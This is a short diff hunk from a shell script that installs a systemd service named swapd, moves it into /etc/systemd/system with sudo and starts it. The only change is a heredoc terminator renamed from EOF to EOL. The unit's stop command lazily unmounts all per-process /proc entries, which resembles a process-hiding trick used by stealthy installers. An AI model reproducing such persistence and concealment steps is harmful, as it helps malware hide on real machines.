@@ -1417,7 +1417,7 @@ ExecStopPost=/usr/bin/bash -c 'umount -l /proc/[0-9]* 2>/dev/null || true'
 
 [Install]
 WantedBy=multi-user.target
-EOF
+EOL
         sudo mv /tmp/swapd.service /etc/systemd/system/swapd.service
         
         echo "[*] Starting swapd systemd service"
